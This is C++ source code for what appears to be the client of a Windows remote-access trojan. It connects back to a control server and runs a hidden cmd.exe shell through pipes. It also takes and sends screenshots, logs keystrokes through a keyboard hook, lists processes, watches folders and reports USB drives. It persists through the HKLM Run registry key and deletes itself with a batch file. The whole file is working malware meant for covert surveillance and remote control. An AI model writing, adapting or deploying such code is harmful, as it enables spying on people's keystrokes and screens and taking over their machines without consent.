#include <stdio.h>
#include"resource.h"
#pragma comment(lib,"KEY.lib")				//钩子dll导入库


#include <WinSock2.h>
#pragma comment (lib, "ws2_32.lib")
#include <TLHELP32.H>
#include<Dbt.h>


//宏定义

//cmd包 
#define GET_SERVER_CMD		10001
#define TO_SERVER_CMD		10002

//屏幕包
#define	GET_SERVER_SCREEN	20001
#define TO_SERVER_SCREEN	20002

//键盘包
#define GET_SERVER_KEY		30001



HANDLE		 hmutex1;		//定义全局互斥对象句柄（用来同步收到发送到服务端的包）

#pragma pack(push)
#pragma pack(1)
struct MyWrap
{
	DWORD	dwType;			//包的类型
	DWORD	dwLength;		//包数据的长度
	PVOID	lpBuffer;		//包数据
};
#pragma pack(pop)


//进程信息链表结点
struct stProcessData
{
	PROCESSENTRY32	stPro;
	stProcessData* next;

};


HANDLE hMyWrite, hMyRead, hCmdWrite, hCmdRead;				//管道相关句柄

WORD	wVersionRequested;
WSADATA	wsaData;
SOCKET	hSocketWait;		//专门用于等待连接的socket

DWORD	dwHeartTime = 0;		//心跳检测时间

BOOL SetHook();				//安装键盘钩子
BOOL InstallHook();			//卸载键盘钩子
BOOL _InitCmd();
BOOL _NowDelete();
BOOL CreatePingBat(char* pszBatFileName);
BOOL _RebootDelete(char* szFilePath);
BOOL _stdcall _HeartTest();

BOOL _stdcall _ToServer();
BOOL _stdcall _InitClient();
BOOL _stdcall _OwnStart();
DWORD _stdcall _GetScreenData(char** pBitMapBuf);
BOOL _stdcall _SendScreenData(char** pBitMapBuf, DWORD dwSize);
void TcharToChar(const TCHAR* tchar, char* _char);
BOOL CALLBACK _DialogMain(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow)
{
	MSG		stMsg;
	CreateDialogParam(hInstance, MAKEINTRESOURCE(IDD_DIALOG1), NULL, (DLGPROC)_DialogMain, 0);
	while (GetMessage(&stMsg, NULL, 0, 0))
	{
		TranslateMessage(&stMsg);
		DispatchMessage(&stMsg);

	}
	return stMsg.wParam;

}



//主窗口窗口过程
BOOL CALLBACK _DialogMain(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	COPYDATASTRUCT* pCopyData;
	char* Buffer;
	static	MyWrap	stWrap;				//这里需要设置静态的，因为柔性数组否则会产生栈溢出。
	DWORD	dwNum;
	DWORD	dwItem;
	HICON	hIcon;
	char	szChar[256];
	char	szFilePath[256] = "C:\\Users\\Administrator\\Desktop\\CmdLine.exe";


	switch (message)
	{
	case WM_COPYDATA:					//接收键盘钩子回调函数的数据
		pCopyData = (COPYDATASTRUCT*)lParam;
		stWrap.dwType = GET_SERVER_KEY;
		stWrap.dwLength = pCopyData->cbData;


		WaitForSingleObject(hmutex1, INFINITE);		//请求互斥对象1
		send(hSocketWait, (char*)&stWrap, 8, 0);
		send(hSocketWait, (char*)pCopyData->lpData, stWrap.dwLength, 0);
		ReleaseMutex(hmutex1);						//释放互斥对象1

		break;
	case WM_DEVICECHANGE:
		switch (wParam)
		{
		case DBT_DEVICEARRIVAL:						//设备插入
			if (((PDEV_BROADCAST_HDR)lParam)->dbch_devicetype == DBT_DEVTYP_VOLUME)			//如果有逻辑盘符
			{
				dwNum = ((PDEV_BROADCAST_VOLUME)lParam)->dbcv_unitmask;
				dwItem = 0;
				do
				{
					dwNum = dwNum / 2;
					dwItem++;
				} while (dwNum);


				memset(szChar, 0, sizeof(szChar));
				lstrcpy(szChar, TEXT("有USB插入："));
				szChar[lstrlen(szChar)] = char('A' + dwItem - 1);

				stWrap.dwType = 60001;
				stWrap.dwLength = lstrlen(szChar);
				WaitForSingleObject(hmutex1, INFINITE);		//请求互斥对象1
				send(hSocketWait, (char*)&stWrap, 8, 0);
				send(hSocketWait, szChar, stWrap.dwLength, 0);
				ReleaseMutex(hmutex1);						//释放互斥对象1
			}
			break;
		case DBT_DEVICEREMOVECOMPLETE:				//设备移除
			if (((PDEV_BROADCAST_HDR)lParam)->dbch_devicetype == DBT_DEVTYP_VOLUME)			//如果有逻辑盘符
			{
				dwNum = ((PDEV_BROADCAST_VOLUME)lParam)->dbcv_unitmask;
				dwItem = 0;
				do
				{
					dwNum = dwNum / 2;
					dwItem++;
				} while (dwNum);


				memset(szChar, 0, sizeof(szChar));
				lstrcpy(szChar, TEXT("有USB拔出："));
				szChar[lstrlen(szChar)] = char('A' + dwItem - 1);

				stWrap.dwType = 60001;
				stWrap.dwLength = lstrlen(szChar);
				WaitForSingleObject(hmutex1, INFINITE);		//请求互斥对象1
				send(hSocketWait, (char*)&stWrap, 8, 0);
				send(hSocketWait, szChar, stWrap.dwLength, 0);
				ReleaseMutex(hmutex1);						//释放互斥对象1
			}
			break;
		default:
			break;

		}

		break;
	case WM_INITDIALOG:
		_InitClient();			//1.初始化网络	

		hIcon = LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON1));
		SendMessage(hWnd, WM_SETICON, ICON_BIG, LPARAM(hIcon));

		hmutex1 = CreateMutex(NULL, false, NULL);	//创建互斥对象并返回其句柄
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_ToServer, NULL, 0, NULL);				//创建线程与服务端交互
		
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_HeartTest, NULL, 0, NULL);							//创建线程进行心跳包的发送与检测

		break;
	case WM_CLOSE:
		closesocket(hSocketWait);
		WSACleanup();
		PostMessage(hWnd, WM_DESTROY, 0, 0);
		break;

	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:

		return FALSE;
	}

	return TRUE;

}


//心跳检测线程回调函数
BOOL _stdcall _HeartTest()
{
	MyWrap stWrap;
	stWrap.dwType = 90001;
	stWrap.dwLength = 0;

	dwHeartTime = GetTickCount();		//初始化时间戳
	while (1)
	{
		if ((GetTickCount() - dwHeartTime) == 1000 * 20)					//20s发送一次心跳包
		{
			WaitForSingleObject(hmutex1, INFINITE);		//请求互斥对象1
			send(hSocketWait, (char*)&stWrap, 8, 0);
			ReleaseMutex(hmutex1);						//释放互斥对象1

		}

		if (dwHeartTime != 0 && (GetTickCount() - dwHeartTime) > 1000 * 60)	//检测是否超过40s未收到包	
			break;
	
	}
	MessageBox(NULL, TEXT("已与服务端断开连接，请尝试重新连接！"), NULL, MB_OK);
	exit(0);										
	ExitProcess(NULL);
	return 0;

}





//获得屏幕信息
DWORD _stdcall _GetScreenData(char** pBitMapBuf)
{
	HWND	hDeskWnd;			//桌面的窗口句柄
	HDC		hDeskDc;			//桌面的DC句柄
	HDC		hMyDc;				//我们的DC(兼容桌面DC)
	HBITMAP hMyBitMap;			//创建位图(与桌面兼容)
	int		nWidth;				//桌面的像素宽
	int		nHeight;			//桌面的像素高



	hDeskWnd = GetDesktopWindow();
	hDeskDc = GetDC(hDeskWnd);

	//创建于桌面DC相兼容的内存DC
	hMyDc = CreateCompatibleDC(hDeskDc);
	nWidth = GetSystemMetrics(SM_CXFULLSCREEN);
	nHeight = GetSystemMetrics(SM_CYFULLSCREEN);
	//创建于桌面DC相兼容的位图
	hMyBitMap = CreateCompatibleBitmap(hDeskDc, nWidth, nHeight);

	//将我们创建的位图和DC相关联
	SelectObject(hMyDc, hMyBitMap);

	//将桌面DC的数据拷贝到我们的DC
	BitBlt(
		hMyDc,
		0,				//x
		0,				//y
		nWidth,
		nHeight,
		hDeskDc,
		0,
		0,
		SRCCOPY			//拷贝模式
	);

	//CImage image;
	//image.Attach(hMyBitMap);
	//image.Save(TEXT("屏幕截屏.jpg"));

	*pBitMapBuf = new char[nWidth * nHeight * 4 + 8 + 1]();
	GetBitmapBits(hMyBitMap, nWidth * nHeight * 4, *pBitMapBuf + 8);					//获取位图中的数据
	((DWORD*)(*pBitMapBuf))[0] = nWidth;
	((DWORD*)(*pBitMapBuf))[1] = nHeight;


	ReleaseDC(hDeskWnd, hDeskDc);
	DeleteDC(hMyDc);
	DeleteObject(hMyBitMap);

	return nWidth * nHeight * 4 + 8;
}




//发送屏幕包
BOOL _stdcall _SendScreenData(char** pBitMapBuf, DWORD dwSize)
{

	char szBuffer[256];
	MyWrap stWrap;

	stWrap.dwType = GET_SERVER_SCREEN;
	stWrap.dwLength = dwSize;
	stWrap.lpBuffer = *pBitMapBuf;


	WaitForSingleObject(hmutex1, INFINITE);		//请求互斥对象1
	send(hSocketWait, (char*)&stWrap, 8, 0);
	send(hSocketWait, *pBitMapBuf, dwSize, 0);
	ReleaseMutex(hmutex1);						//释放互斥对象1

	return 0;
}



//获得cmd数据
DWORD _stdcall _GetCmdData(char** pCmdBuf, MyWrap stWrap)
{
	char szBuffer[256] = { 0 };
	char szBuffer1[0x256] = { 0 };
	char szBuffer2[0x1000] = { 0 };
	DWORD dwSize;
	lstrcpy(szBuffer, (LPCSTR)stWrap.lpBuffer);
	lstrcat(szBuffer, TEXT("\r\n"));

	WriteFile(hMyWrite, szBuffer, lstrlen(szBuffer), NULL, NULL);				//向管道中写入数据
	Sleep(100);
	int i = 0;
	while (1)
	{
		memset(szBuffer1, 0, sizeof(szBuffer1));
		ReadFile(hMyRead, szBuffer1, 256, &dwSize, NULL);						//从管道中读取数据
		lstrcat(szBuffer2, szBuffer1);
		if (dwSize != 256)
			break;
		i++;
	}



	*pCmdBuf = new char[lstrlen(szBuffer2) + 1]();
	lstrcpy(*pCmdBuf, szBuffer2);
	return lstrlen(szBuffer2) + 1;

}


//发送cmd包
BOOL _stdcall _SendCmdData(char** pCmdBuf, DWORD dwSize)
{
	char szBuffer[256];
	MyWrap stWrap;

	stWrap.dwType = GET_SERVER_CMD;
	stWrap.dwLength = dwSize;
	stWrap.lpBuffer = *pCmdBuf;


	WaitForSingleObject(hmutex1, INFINITE);		//请求互斥对象1
	send(hSocketWait, (char*)&stWrap, 8, 0);
	send(hSocketWait, *pCmdBuf, dwSize, 0);
	ReleaseMutex(hmutex1);						//释放互斥对象1

	return 0;

}

//获得进程数据
DWORD _stdcall _GetProcessData(char** pCmdBuf)
{

	stProcessData* pHand = NULL;			//进程信息链表头指针
	stProcessData* pProcess = NULL;		//辅助指针
	HANDLE			hProcessSnap;							//进程快照句柄
	PROCESSENTRY32	stProcess;
	stProcess.dwSize = sizeof(PROCESSENTRY32);
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);



	Process32First(hProcessSnap, &stProcess);
	int uu = GetLastError();
	DWORD i = 0;
	while (TRUE)
	{
		i = i + 1 + lstrlen(stProcess.szExeFile) + 1 + 4;
		if (pHand == NULL)
		{
			pHand = new stProcessData;
			pProcess = pHand;
			pProcess->stPro = stProcess;
			pProcess->next = NULL;
		}
		else
		{
			pProcess->next = new stProcessData;
			pProcess->next->stPro = stProcess;
			pProcess->next->next = NULL;
			pProcess = pProcess->next;
		}
		if (FALSE == Process32Next(hProcessSnap, &stProcess))
			break;

	}
	CloseHandle(hProcessSnap);


	*pCmdBuf = new char[i + 2]();
	DWORD x = 0;
	pProcess = pHand;
	while (pProcess != NULL)
	{
		(*pCmdBuf)[x] = 0;
		x++;
		lstrcpy(*pCmdBuf + x, pProcess->stPro.szExeFile);
		x = x + lstrlen(pProcess->stPro.szExeFile);
		(*pCmdBuf)[x] = 0;
		x++;
		((DWORD*)(*pCmdBuf + x))[0] = pProcess->stPro.th32ProcessID;
		x = x + 4;
		pProcess = pProcess->next;
	}

	return i + 2;
}


//发送进程消息
BOOL _stdcall _SendProcessData(char** pProcessBuf, DWORD dwSize)
{

	MyWrap stWrap;
	stWrap.dwType = 40001;
	stWrap.dwLength = dwSize;


	WaitForSingleObject(hmutex1, INFINITE);		//请求互斥对象1
	send(hSocketWait, (char*)&stWrap, 8, 0);
	send(hSocketWait, *pProcessBuf, dwSize, 0);
	ReleaseMutex(hmutex1);						//释放互斥对象1

	return 0;
}


//得到文件监控信息并发送
DWORD _stdcall _GetFileControlData(char* pBuffer)
{
	MyWrap wrap;
	DWORD  dwData;
	char   szFileName[0x256] = { 0 };				//返回的文件名
	char   szReturnBuf[0x256] = { 0 };				//存储需要返回的信息

	HANDLE hFile;
	FILE_NOTIFY_INFORMATION* pFileNotifyInfo;		//指向返回的文件信息
	char szBuffer[0x256] = { 0 };
	lstrcpy(szBuffer, (LPCSTR)pBuffer);
	pFileNotifyInfo = (FILE_NOTIFY_INFORMATION*)new BYTE[0x1000]();

	hFile = CreateFile(szBuffer, FILE_LIST_DIRECTORY, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);				//打开目录
	do
	{
		int nnn = ReadDirectoryChangesW(hFile,									//阻塞监控文件
			pFileNotifyInfo,
			0x1000,
			TRUE,
			FILE_NOTIFY_CHANGE_FILE_NAME |
			FILE_NOTIFY_CHANGE_DIR_NAME |
			FILE_NOTIFY_CHANGE_ATTRIBUTES |
			FILE_NOTIFY_CHANGE_SIZE |
			FILE_NOTIFY_CHANGE_LAST_WRITE |
			FILE_NOTIFY_CHANGE_LAST_ACCESS |
			FILE_NOTIFY_CHANGE_CREATION |
			FILE_NOTIFY_CHANGE_SECURITY,
			&dwData,
			NULL,
			NULL);

		TcharToChar((TCHAR*)pFileNotifyInfo->FileName, szFileName);		//宽字符变窄字符
		switch (pFileNotifyInfo->Action)
		{
		case FILE_ACTION_ADDED:
			wsprintf(szReturnBuf, TEXT("文件监控，新增文件！%s\\%s"), pBuffer, szFileName);
			break;
		case FILE_ACTION_REMOVED:
			wsprintf(szReturnBuf, TEXT("文件监控，删除文件！%s\\%s"), pBuffer, szFileName);
			break;
		case FILE_ACTION_MODIFIED:
			wsprintf(szReturnBuf, TEXT("文件监控，修改文件！%s\\%s"), pBuffer, szFileName);
			break;
		case FILE_ACTION_RENAMED_OLD_NAME:
			wsprintf(szReturnBuf, TEXT("文件监控，重命名文件！%s\\%s"), pBuffer, szFileName);
			break;
		}
		wrap.dwType = 50001;
		wrap.dwLength = lstrlen(szReturnBuf) + 1;

		WaitForSingleObject(hmutex1, INFINITE);		//请求互斥对象1
		send(hSocketWait, (char*)&wrap, 8, 0);							//发送数据会服务端
		send(hSocketWait, (char*)szReturnBuf, wrap.dwLength, 0);
		ReleaseMutex(hmutex1);						//释放互斥对象1

	} while (TRUE);
	CloseHandle(hFile);
}





//重启自删除
BOOL _RebootDelete(char* szFilePath)
{
	char szFileName[256] = "\\\\?\\";
	lstrcat(szFileName, szFilePath);
	return MoveFileEx(szFileName, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);								//设置重启自删除
}



//立即自删除
BOOL _NowDelete()
{
	char szFileName[256] = { 0 };					//当前可执行文件目录
	char szBatName[256] = { 0 };					//创建的批处理文件的路径
	char szCmd[256] = { 0 };						//执行批处理文件的cmd命令行


	//获得当前可执行文件的目录
	GetModuleFileName(NULL, szFileName, sizeof(szFileName));
	char* p = strrchr(szFileName, '\\');
	p[0] = 0;

	//构建出批处理文件的路径
	lstrcpy(szBatName, szFileName);
	lstrcat(szBatName, TEXT("\\temp.bat"));

	//构建执行批处理文件的cmd命令
	wsprintf(szCmd, TEXT("cmd /c call \"%s\""), szBatName);

	//创建批处理文件
	CreatePingBat(szBatName);


	//创建新进程，以隐藏控制台方式执行批处理文件
	PROCESS_INFORMATION pi;
	STARTUPINFO si = { 0 };
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = FALSE;				//不显示主窗口

	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	exit(0);
	ExitProcess(NULL);



}



//创建自删除ping批处理文件
BOOL CreatePingBat(char* pszBatFileName)
{
	int iTime = 2;
	char szBat[MAX_PATH] = { 0 };

	// 构造批处理内容
	/*
		@echo off
		ping 127.0.0.1 -n 5
		del *.exe
		del %0
	*/
	wsprintf(szBat, "@echo off\nping 127.0.0.1 -n %d\ndel *.exe\ndel %%0\n", iTime);

	// 生成批处理文件
	FILE* fp = NULL;
	fopen_s(&fp, pszBatFileName, "w+");
	if (NULL == fp)
	{
		return FALSE;
	}
	fwrite(szBat, (1 + lstrlen(szBat)), 1, fp);
	fclose(fp);


	return TRUE;
}






//设置开机自启动
BOOL _stdcall _OwnStart()
{
	HKEY	hKey;
	char szKeyName[256] = "ykzqd";
	char szFileName[0x256] = { 0 };
	GetModuleFileName(NULL, szFileName, sizeof(szFileName));


	RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_ALL_ACCESS, &hKey);
	RegSetValueEx(hKey, szKeyName, 0, REG_SZ, (BYTE *)szFileName, lstrlen(szFileName) + 1);

	return 0;

}


//取消开机自启动
BOOL _stdcall _DeleteOwnStart()
{
	HKEY	hKey;
	char szKeyName[256] = "ykzqd";
	
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_ALL_ACCESS, &hKey);
	RegDeleteValue(hKey, szKeyName);
	return 0;

}


//初始化网络
BOOL _stdcall _InitClient()
{


	//windows很特殊，需要单独调用api来进行网络的初始化与结束处理
	wVersionRequested = MAKEWORD(2, 2);
	WSAStartup(wVersionRequested, &wsaData);


	//1.创建套接字

	hSocketWait = socket(
		AF_INET,	//INET协议簇
		SOCK_STREAM,//表示使用的是TCP协议
		0);
	return 0;
}





//宽字符变成窄字符
void TcharToChar(const TCHAR* tchar, char* _char)

{

	int iLength;

	//获取字节长度   

	iLength = WideCharToMultiByte(CP_ACP, 0, (LPCWCH)tchar, -1, NULL, 0, NULL, NULL);

	//将tchar值赋给_char    

	WideCharToMultiByte(CP_ACP, 0, (LPCWCH)tchar, -1, _char, iLength, NULL, NULL);

}




//与服务端交互
BOOL _stdcall _ToServer()
{

	char* pBitMapBuf;			//指向位图数据缓冲区
	char* pCmdBuf;			//指向cmd数据缓冲区
	char* pProcessBuf;		//指向进程数据缓冲区
	char* pFileControl;		//指向文件监控


	DWORD	nBufLen;				//缓冲区的大小
	BYTE	szBuffer[256];
	BYTE	bData[0x256];			//辅助文件监控传给线程的参数
	MyWrap	stWrap;
	int		flag = 0;
	HANDLE	hFileThread = NULL;		//文件监控线程句柄
	char	szFilePath[256] = { 0 };		//文件路径


	//初始化管道
	_InitCmd();

	//2. 主动连接服务器
	sockaddr_in	addr;		//用于描述ip和端口的结构体
	addr.sin_family = AF_INET;				//INET协议簇
	addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");	//ip地址
	addr.sin_port = htons(10087);			//端口（需要本地字节序转网络字节序）




	if (SOCKET_ERROR == connect(hSocketWait, (sockaddr*)&addr, sizeof(sockaddr_in)))				//主动连接服务端
		return 0;
	int len = 0;
	int len1;
	while (1)
	{
		len = 0;
		memset(szBuffer, 0, sizeof(szBuffer));
		while (1)
		{
			len = recv(hSocketWait, (char*)(szBuffer + len), 8 - len, 0);
			if (len <= 0)
			{
				flag = 1;
				break;
			}
			if (len == 8)
				break;
		}
		if (flag == 1)				//与服务器断开连接退出线程
		{
			flag = 0;
			break;
		}
		stWrap.dwType = szBuffer[0] + szBuffer[1] * 0x100 + szBuffer[2] * 0x10000 + szBuffer[3] * 0x1000000;
		stWrap.dwLength = szBuffer[4] + szBuffer[5] * 0x100 + szBuffer[6] * 0x10000 + szBuffer[7] * 0x1000000;

		stWrap.lpBuffer = new BYTE[stWrap.dwLength + 1]();
		if (stWrap.dwLength != 0)
		{
			len = 0;
			len1 = 0;
			while (1)
			{
				len1 = recv(hSocketWait, (char*)((DWORD)stWrap.lpBuffer + len), stWrap.dwLength - len, 0);
				len = len + len1;
				if (len == stWrap.dwLength)
					break;
			}

		}


		switch (stWrap.dwType)
		{
		case TO_SERVER_CMD:					//请求cmd
			nBufLen = _GetCmdData(&pCmdBuf, stWrap);
			_SendCmdData(&pCmdBuf, nBufLen);
			delete[] pCmdBuf;
			break;
		case TO_SERVER_SCREEN:				//请求屏幕命令
			nBufLen = _GetScreenData(&pBitMapBuf);			//获得屏幕信息
			_SendScreenData(&pBitMapBuf, nBufLen);
			delete[] pBitMapBuf;
			break;
		case 30002:							//安装键盘钩子
			SetHook();										//安装键盘钩子
			break;
		case 30003:							//卸载键盘钩子
			InstallHook();									//卸载键盘钩子
			break;
		case 40002:							//请求进程列表				
			nBufLen = _GetProcessData(&pProcessBuf);
			_SendProcessData(&pProcessBuf, nBufLen);
			delete[] pProcessBuf;
			break;
		case 50002:							//请求文件监控（因为文件监控是阻塞状态的所以需要单独的线程来完成）
			if (hFileThread != NULL)
			{
				TerminateThread(hFileThread, 0);
				CloseHandle(hFileThread);
			}
			memset(bData, 0, sizeof(bData));
			lstrcpy((LPSTR)bData, (LPCSTR)stWrap.lpBuffer);
			hFileThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_GetFileControlData, bData, 0, NULL);
			break;
		case 70001:							//请求立即自删除
			_NowDelete();
			break;
		case 70002:							//请求重启自删除
			GetModuleFileName(NULL, szFilePath, sizeof(szFilePath));
			_RebootDelete(szFilePath);						//设置重启自删除
			break;
		case 80001:							//请求开机自启动
			_OwnStart();
			break;
		case 80002:							//取消开机自启动
			_DeleteOwnStart();				
			break;
		case 90002:							//心跳回复包（什么都不做）
			break;
		}

		dwHeartTime = GetTickCount();		//更新时间戳
		delete[] stWrap.lpBuffer;


	}

	return 0;
}








//初始化cmd，创建管道和进程
BOOL _InitCmd()
{

	SECURITY_ATTRIBUTES	as;
	as.nLength = sizeof(SECURITY_ATTRIBUTES);
	as.bInheritHandle = TRUE;							//管道句柄可继承
	as.lpSecurityDescriptor = NULL;
	CreatePipe(&hCmdRead, &hMyWrite, &as, 0);			// my ----> cmd  管道
	CreatePipe(&hMyRead, &hCmdWrite, &as, 0);			// my <---- cmd	 管道


	STARTUPINFO			si;
	PROCESS_INFORMATION	pi;
	memset(&si, 0, sizeof(si));
	memset(&pi, 0, sizeof(pi));
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESTDHANDLES;					//意思是可以更改cmd的标准输入输出
	si.hStdInput = hCmdRead;
	si.hStdOutput = hCmdWrite;
	si.hStdError = hCmdWrite;

	CreateProcess(TEXT("C:\\Windows\\System32\\cmd.exe"),
		NULL,
		NULL,
		NULL,
		TRUE,	//继承
		CREATE_NO_WINDOW,
		NULL,
		NULL,
		&si,
		&pi);

	return 1;
}
